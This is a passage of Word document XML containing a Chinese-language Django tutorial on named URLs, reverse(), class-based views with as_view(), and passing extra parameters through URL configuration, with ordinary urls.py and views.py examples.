          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 展示某篇文章</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E146FED" w14:textId="79C87975" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7116D6B3" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>URL的命名及reverse()方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="143777C2" w14:textId="653F4E15" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EFA0227" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>你注意到没？我们在上述代码中还给URL取了一个名字 'article'。这个名字大有用处，相当于给URL取了个全局变量的名字。它可以让你能够在Django的任意处，尤其是模板内显式地引用它。假设你需要在模板中通过链接指向一篇具体文章，下面那种方式更好？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B73D618" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>方法1: 使用命名URL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE1B0A8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;a href="{% url 'article' id %}"&gt;Article&lt;/a&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="112564C6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72E6D623" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法2: 使用常规URL - 不建议</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4831603E" w14:textId="6297C17D" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;a href="blog/article/id"&gt;Article&lt;/a&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29460EB4" w14:textId="1CB1F4FA" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FAEE39B" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果你还没意识到方法1的好处，那么想想吧，假设你需要把全部模板链接由blog/article/id改为blog/articles/id, 那种方法更快？改所有模板，还是改URL配置里的一个字母?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="735EB7CD" w14:textId="667DA7D8" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13BE357A" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>可惜的是命名的URL一般只在模板里使用，不能直接在视图里使用。如果我们有了命名的URL，我们如何把它转化成常规的URL在视图里使用呢？Django提供的reverse()方法很容易实现这点。假设不同的app（比如news和blog)里都有article这个命名URL, 我们怎么区分呢？ 我们只需要在article前面加上blog这个命名空间即可。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E2D200" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import reverse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3A6BC4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D274591" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># output blog/article/id</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0316427F" w14:textId="454542FA" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>reverse('blog:article', args=[id])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0801A5F5" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="424854BD" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>URL如何指向基于类的视图(View)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE7B1FC" w14:textId="36A48FDD" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32A41193" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>目前path和re_path都只能指向视图view里的一个函数或方法，而不能指向一个基于类的视图(Class based view)。Django提供了一个额外as_view()方法，可以将一个类伪装成方法。这点在当你使用Django在带的view类或自定义的类时候非常重要。具体使用方式如下:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B590C94" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># blog/urls.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="259C9866" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import path, re_path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A601A3D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54955F79" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from . import views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2107BF0D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="448D21EA"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3DC4C740" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      path('', views.ArticleList.as_view(), name='article_list'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0776C3E0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    path('blog/article/&lt;int:id&gt;/', views.article, name = 'article'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA9531C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    re_path(r'^blog/article/(?P&lt;id&gt;\d+)/$', views.article, name='article'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="034B4B40" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60369336" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13A066FC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># View (in blog/views.py)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68EC019B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.generic import ListView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C71013" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>from .views import Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18792653" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="302CC498" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ArticleList(ListView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E0933A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3227E8FC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    queryset = Article.objects.filter(date__lte=timezone.now()).order_by('date')[:5]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="702D4FD7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    context_object_name = 'latest_article_list'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26EA5C66"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'blog/article_list.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56EC352F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15CC51AB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def article(request, id):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B430626" w14:textId="3EC1399F" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 展示某篇文章</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354FC02A" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F8BD55C" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>通过URL方法传递额外的参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42851CEA" w14:textId="5A65DCD8" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07B30578" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在你配置URL时，你还可以通过字典的形式传递额外的参数给视图, 而不用把这个参数写在链接里。如下面案例所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E1EA308" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># blog/urls.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26962661" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import path, re_path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="024DD8F8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="552B569D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from . import views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6790ED5E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BF8615F"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2805785C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63BCE353" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
